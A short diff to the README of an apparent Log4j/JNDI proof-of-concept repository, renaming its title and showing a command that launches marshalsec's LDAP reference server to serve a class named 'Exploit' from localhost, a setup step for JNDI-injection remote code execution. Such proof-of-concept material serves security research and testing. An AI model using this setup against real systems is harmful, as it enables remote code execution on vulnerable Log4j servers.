@@ -1,4 +1,4 @@
-# jndi-poc
+# jndi/log4j-poc
 How to set up marshalsec's LDAP provider server:
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1/#Exploit
 
